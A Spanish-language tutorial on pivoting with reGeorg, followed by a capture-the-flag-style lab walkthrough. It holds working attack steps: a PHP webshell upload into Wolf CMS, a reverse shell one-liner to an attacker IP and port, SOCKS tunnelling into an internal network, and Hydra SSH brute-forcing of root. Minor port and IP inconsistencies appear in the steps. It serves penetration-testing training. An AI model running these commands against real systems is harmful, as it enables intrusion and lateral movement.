
# Pivoting con reGeorg

## <mark style="color:purple;">¿Qué es reGeorg?</mark>

**reGeorg** es una herramienta de tunneling HTTP que permite convertir un servidor web comprometido en un proxy SOCKS, facilitando el **pivoting** hacia redes internas no accesibles directamente. Es el sucesor de reDuh y está diseñado específicamente para situaciones donde el acceso al sistema objetivo está limitado únicamente al puerto 80/443 (HTTP/HTTPS) y no se puede obtener una reverse shell tradicional.

#### **Escenario típico de uso:**

* Has obtenido un webshell en un servidor web (victim\_a) que tiene dos interfaces de red: una pública (accesible desde Internet) y otra privada (conectada a una red interna 10.0.0.0/24)
* El servidor web puede comunicarse con otros hosts internos (victim\_b, victim\_c), pero tu máquina atacante no puede alcanzarlos directamente
* El firewall solo permite tráfico HTTP/HTTPS hacia el servidor web, bloqueando otros puertos

#### **¿Cómo funciona?**&#x20;

reGeorg establece un túnel HTTP entre tu máquina atacante y el servidor web comprometido. Las peticiones SOCKS que realices localmente se encapsulan en peticiones HTTP que viajan hasta el servidor, donde el script `tunnel.php/jsp/aspx` las desencapsula y las reenvía al destino interno. Las respuestas siguen el camino inverso.

## <mark style="color:purple;">Instalación</mark>

#### **Versión original (sensepost/reGeorg) - Python 2**

{% embed url="<https://github.com/sensepost/reGeorg>" %}

```bash
git clone https://github.com/sensepost/reGeorg.git
cd reGeorg
```

**Dependencias:**

```bash
pip install urllib3
```

#### **Neo-reGeorg (versión mejorada con cifrado)**

La versión más avanzada, con cifrado Base64 y capacidad de evasión de detecciones.

{% embed url="<https://github.com/L-codes/Neo-reGeorg>" %}

```bash
git clone https://github.com/L-codes/Neo-reGeorg.git
cd Neo-reGeorg
pip install -r requirements.txt
```

## <mark style="color:purple;">Cheatsheet de comandos</mark>

#### **Preparación del túnel**

| Acción                                       | Comando                                                                 |
| -------------------------------------------- | ----------------------------------------------------------------------- |
| **Ver scripts disponibles**                  | `ls tunnels/` (original) o `ls neoreg_servers/` (Neo-reGeorg)           |
| **Generar scripts cifrados (Neo-reGeorg)**   | `python3 neoreg.py generate -k <password>`                              |
| **Generar con respuesta HTTP personalizada** | `python3 neoreg.py generate -k password --file 404.html --httpcode 404` |

#### **Subida del script al servidor (vía webshell)**

```bash
# Ejemplo con webshell (desde tu máquina)
upload /ruta/reGeorg/tunnels/tunnel.php C:\inetpub\wwwroot\tunnel.php
```

**Archivos según entorno:**

<table data-header-hidden><thead><tr><th width="224.8333740234375"></th><th></th></tr></thead><tbody><tr><td>Entorno web</td><td>Script a subir</td></tr><tr><td>PHP</td><td><code>tunnel.php</code> o <code>tunnel.nosocket.php</code></td></tr><tr><td><a href="https://asp.net/">ASP.NET</a></td><td><code>tunnel.aspx</code> o <code>tunnel.ashx</code></td></tr><tr><td>Java/JSP</td><td><code>tunnel.jsp</code></td></tr><tr><td>Tomcat 5</td><td><code>tunnel.tomcat.5.jsp</code></td></tr><tr><td>JavaScript (Node.js)</td><td><code>tunnel.js</code></td></tr></tbody></table>

**Verificación del script**

Accede al script desde el navegador:

```
http://victim_a.com/tunnel.php
```

Debe mostrar: **"`Georg says, 'All seems fine'`"**&#x20;

#### **Inicio del proxy SOCKS local**

**reGeorg original (Python 2):**

```bash
python reGeorgSocksProxy.py -u http://victim_a.com/tunnel.php -p 9050
```

**Neo-reGeorg (recomendado):**

```bash
python3 neoreg.py -k <password> -u http://victim_a.com/tunnel.php -p 9050
```

**Parámetros comunes:**

<table data-header-hidden><thead><tr><th width="187.3333740234375"></th><th width="267.5"></th><th></th></tr></thead><tbody><tr><td>Parámetro</td><td>Descripción</td><td>Ejemplo</td></tr><tr><td><code>-u, --url</code></td><td>URL del script en el servidor</td><td><code>http://target.com/tunnel.php</code></td></tr><tr><td><code>-p, --listen-port</code></td><td>Puerto local para SOCKS</td><td><code>9050</code></td></tr><tr><td><code>-l, --listen-on</code></td><td>IP local para escuchar</td><td><code>127.0.0.1</code></td></tr><tr><td><code>-v, --verbose</code></td><td>Modo verbose (INFO/DEBUG)</td><td><code>-v</code></td></tr><tr><td><code>-c, --creds</code></td><td>Autenticación básica</td><td><code>user:pass</code></td></tr><tr><td><code>-s, --ssl</code></td><td>Verificar certificado SSL</td><td><code>-s</code></td></tr></tbody></table>

#### **Configuración de herramientas para usar el proxy**

**Proxychains (Linux):**

```bash
# Editar /etc/proxychains.conf
socks5 127.0.0.1 9050

# Usar proxychains
proxychains nmap -sT -Pn 192.168.1.0/24
proxychains curl http://192.168.1.100
proxychains rdesktop 192.168.1.50
```

**Variable de entorno (Linux):**

```bash
export http_proxy=socks5://127.0.0.1:9050
export https_proxy=socks5://127.0.0.1:9050
curl http://192.168.1.100
```

**Prueba de conectividad**

```bash
# Verificar que el proxy funciona
curl -x socks5://127.0.0.1:1080 http://192.168.1.100

# Con proxychains
proxychains curl http://192.168.1.100
```

## <mark style="color:purple;">Ejemplo práctico completo</mark>

#### **Escenario**

* Servidor web comprometido: `203.0.113.10` (IP pública)
* Red interna: `172.16.10.0/24`
* Objetivo interno: `172.16.10.50` (puerto 3389 RDP)

#### **Paso a paso**

1. **Subir tunnel.php al servidor web** (vía webshell o carga de archivos):

```bash
# Asumiendo webshell con upload
upload /opt/reGeorg/tunnels/tunnel.php C:\xampp\htdocs\tunnel.php
```

2. **Verificar el script**:

```bash
curl http://203.0.113.10/tunnel.php
# Output esperado: Georg says, 'All seems fine'
```

3. **Iniciar el proxy SOCKS**:

```bash
python3 reGeorgSocksProxy.py -u http://203.0.113.10/tunnel.php -p 1080 -v
```

4. **Configurar proxychains**:

```bash
echo "socks5 127.0.0.1 9050" >> /etc/proxychains.conf
```

5. **Escanea la red interna**:

```bash
proxychains nmap -sT -Pn 172.16.10.0/24
```

6. **Conecta al objetivo**:

```bash
proxychains rdesktop 172.16.10.50
```

***

## <mark style="color:purple;">Lab:</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**Pivoting VIII**</mark>

En este desafío de pivoting, la arquitectura de red es la que se muestra a continuación:

`Kali` -----------> `Objetivo A` -------------> `Objetivo B`

Una aplicación web se está ejecutando en el Objetivo A. Has conseguido obtener las siguientes credenciales para esta aplicación web mediante phishing. El Objetivo A es accesible en **demo.ine.local.**

* Nombre de usuario: `robert`
* Contraseña: `password1`
* URL de inicio de sesión: `/?/admin`

***

Tu misión es conseguir las flags que se encuentran tanto en el Objetivo A como en el Objetivo B.

#### ¿Cómo se resuelve esto?

* Metasploit está instalado en la instancia de Kali a la que tendrás acceso.
* Toda explotación puede realizarse utilizando métodos de explotación manuales, Hydra y herramientas de terceros.

***

### Hosts

```bash
┌──(root㉿INE)-[~]
└─# cat /etc/hosts

127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.12       INE
127.0.0.1 AttackDefense-Kali
192.64.37.2     INE
192.64.37.2 INE
192.64.37.3 demo.ine.local
```

### Escaneo de puertos

```bash
┌──(root㉿INE)-[~]
└─# nmap -sV demo.ine.local

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
3306/tcp open  mysql   MySQL 5.5.47-0ubuntu0.14.04.1
```

Solo tenemos abiertos los puertos 80 y 3306.

### Acceso web

Accedemos a `http://demo.ine.local/?/admin/login` para loguearnos y observamos que es un Wolf CMS:

<figure><img src="/files/vBQtCNey54scQjnf0PcW" alt=""><figcaption></figcaption></figure>

* Nombre de usuario: `robert`
* Contraseña: `password1`

Nos conseguimos loguear y vemos que podemos gestionar los archivos del CMS:

<figure><img src="/files/BiE4mFJGyXdHpj7GrTOm" alt=""><figcaption></figcaption></figure>

Vemos que usa la versión `0.8.1` lo que nos permite buscar exploits específicos.

### Búsqueda de exploits

```bash
┌──(root㉿INE)-[~]
└─# searchsploit Wolf CMS
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
Wolf CMS - Arbitrary File Upload / Execution                          | php/webapps/38000.txt
Wolf CMS 0.6.0b - Multiple Vulnerabilities                            | php/webapps/15614.html
Wolf CMS 0.7.5 - Multiple Vulnerabilities                             | php/webapps/18545.txt
Wolf CMS 0.8.2 - Arbitrary File Upload                                | php/webapps/36818.php
Wolf CMS 0.8.2 - Arbitrary File Upload (Metasploit)                   | php/remote/40004.rb
Wolf CMS 0.8.3.1 - Remote Code Execution (RCE)                        | php/webapps/51421.txt
Wolfcms 0.75 - Cross-Site Request Forgery / Cross-Site Scripting      | php/webapps/18652.txt
WolfCMS 0.8.3.1 - Cross-Site Request Forgery                          | php/webapps/44418.txt
WolfCMS 0.8.3.1 - Open Redirection                                    | php/webapps/44421.txt
WolfSight CMS 3.2 - SQL Injection                                     | php/webapps/44997.txt
---------------------------------------------------------------------- ---------------------------------
```

Aunque vemos que hay un módulo de Metasploit al buscarlo no aparece, por lo que usaremos un exploit manual para RCE:

```bash
┌──(root㉿INE)-[~]
└─# searchsploit -m 51421

  Exploit: Wolf CMS 0.8.3.1 - Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/51421
     Path: /usr/share/exploitdb/exploits/php/webapps/51421.txt
    Codes: N/A
 Verified: False
File Type: Unicode text, UTF-8 text
Copied to: /root/51421.txt
```

```bash
┌──(root㉿INE)-[~]
└─# cat 51421.txt
                                                                                                                                                 
# Exploit Title: Wolf CMS 0.8.3.1 - Remote Code Execution (RCE)
# Date: 2023-05-02
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor Homepage: https://wolf-cms.readthedocs.io
# Software Link: https://github.com/wolfcms/wolfcms
# Version: 0.8.3.1
# Tested on: Kali Linux

### Steps to Reproduce ###

# Firstly, go to the "Files" tab.
# Click on the "Create new file" button and create a php file (e.g:
shell.php)
# Then, click on the file you created to edit it.
# Now, enter your shell code and save the file.
# Finally, go to https://localhost/wolfcms/public/shell.php

### There's your shell! ###
```

Tenemos los pasos de explotación! Vamos a explotarlo.

### Subida de Webshell PHP

Vamos a `Files` > `Upload FIle` > Subir webshell de `/usr/share/webshells/php-backdoor.php`

<figure><img src="/files/iLcjHULmYXpCT9QAFzWi" alt=""><figcaption></figcaption></figure>

#### Acceso a la Webshell

Se sube al directorio `/public`:

```
http://demo.ine.local/public/php-backdoor.php
```

<figure><img src="/files/mdp46vKxGN4DxhUzGvub" alt=""><figcaption></figcaption></figure>

Desde esta webshell podemos ejecutar comandos, y lo usaremos para conseguir una shell con Metasploit.

### Multi Handler

```bash
msfconsole 
use exploit/multi/handler
set payload php/reverse_php
set LHOST 192.64.37.2
exploit

[*] Started reverse TCP handler on 192.64.37.2:4444
```

### Conseguir la Reverse Shell

Usaremos el siguiente comando desde la webshell para recibir la shell:

```bash
php -r '$sock=fsockopen("192.64.37.2",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```bash
[*] Started reverse TCP handler on 192.64.37.2:4444 
[*] Command shell session 1 opened (192.64.37.2:4444 -> 192.64.37.3:42602) at 2026-04-15 13:18:10 +0530

Shell Banner:
/bin/sh: 0: can't access tty; job control turned off
-----
          
$ whoami
www-data
```

#### Tratamiento de la TTY

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

### Flag 1

```bash
www-data@demo:/$ find / -name "*flag*" -type f 2>/dev/null

/app/flag.txt
```

```bash
www-data@demo:/$ cat /app/flag.txt
17189f8af3efbca5511198c8********
```

## <mark style="color:purple;">Pivoting con ReGeorg</mark>

En este punto usaremos ReGeorg para pivotar.

### Ver redes internas

```bash
www-data@demo:/$ ifconfig

eth0      Link encap:Ethernet  HWaddr 02:42:c0:40:25:03  
          inet addr:192.64.37.3  Bcast:192.64.37.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1424 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1324 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:130563 (130.5 KB)  TX bytes:370429 (370.4 KB)

eth1      Link encap:Ethernet  HWaddr 02:42:c0:36:b5:02  
          inet addr:192.54.181.2  Bcast:192.54.181.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:21 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:1726 (1.7 KB)  TX bytes:0 (0.0 B)
```

Observamos la red `192.54.181.0/24` que no es accesible desde el exterior. Podemos intuir que la máquina objetivo es la siguiente IP lógica: `192.54.181.2`.

### Subir tunnel.php

Desde la interfaz de subida de archivos subiremos el archivo `tunnel.php` de reGeorg, lo tenemos en el directorio `/Desktop/tools/reGeorg`:

<figure><img src="/files/CvaaUmcIQe73Q9cLNuyj" alt=""><figcaption></figcaption></figure>

### reGeorg Socks Proxy

Abrimos una nueva terminal y ejecutamos el proxy:

{% hint style="info" %}
Usamos el puerto **9050** porque es el puerto por defecto de ProxyChains
{% endhint %}

```bash
┌──(root㉿INE)-[~/Desktop/tools/reGeorg]
└─# python reGeorgSocksProxy.py -p 9050 -u http://demo.ine.local/public/tunnel.php
    
                     _____
  _____   ______  __|___  |__  ______  _____  _____   ______
 |     | |   ___||   ___|    ||   ___|/     \|     | |   ___|
 |     \ |   ___||   |  |    ||   ___||     ||     \ |   |  |
 |__|\__\|______||______|  __||______|\_____/|__|\__\|______|
                    |_____|
                    ... every office needs a tool like Georg

  willem@sensepost.com / @_w_m__
  sam@sensepost.com / @trowalts
  etienne@sensepost.com / @kamp_staaldraad
  
   
[INFO   ]  Log Level set to [INFO]
[INFO   ]  Starting socks server [127.0.0.1:9050], tunnel at [http://demo.ine.local/public/tunnel.php]
[INFO   ]  Checking if Georg is ready
[INFO   ]  Georg says, 'All seems fine'
```

#### Comprobación

```bash
┌──(root㉿INE)-[~]
└─# netstat -tulpn

Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.11:39813        0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9050          0.0.0.0:*               LISTEN      19751/python
```

### Escaneo de puertos internos

```bash
┌──(root㉿INE)-[~]
└─# proxychains nmap -sT -Pn 192.54.181.3

[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.54.181.3:1025 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.54.181.3:53 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.54.181.3:445 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.54.181.3:993 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.54.181.3:22  ...  OK

PORT   STATE SERVICE
22/tcp open  ssh
```

Solo encontramos el servicio SSH, por lo que únicamente podemos probar a hacer fuerza bruta.

### Bruteforce de SSH

```bash
┌──(root㉿INE)-[~]
└─# proxychains hydra -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-40.txt 192.54.181.3 ssh

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-15 13:39:32
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3957 login tries (l:1/p:3957), ~248 tries per task
[DATA] attacking ssh://192.54.181.3:22/

[22][ssh] host: 192.54.181.3   login: root   password: 1234567890
1 of 1 target successfully completed, 1 valid password found
```

Bingo! Tenemos la contraseña de root

### Acceso SSH

```bash
┌──(root㉿INE)-[~]
└─# proxychains ssh root@192.54.181.3     
                                                                                                
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.54.181.3:22  ...  OK
The authenticity of host '192.54.181.3 (192.54.181.3)' can't be established.
ED25519 key fingerprint is SHA256:Dren9CMZI/JLb2zxmQ2Ph7UHAxZe8Xxap/pWFICnWQs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.54.181.3' (ED25519) to the list of known hosts.

root@192.54.181.3's password: 
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

root@demo2:~# whoami
root
```

### Flag 2

```bash
root@demo2:~# ls
flag.txt  start.sh

root@demo2:~# cat flag.txt 
f9a32da38bf9fba2b6c7f7b7********
```
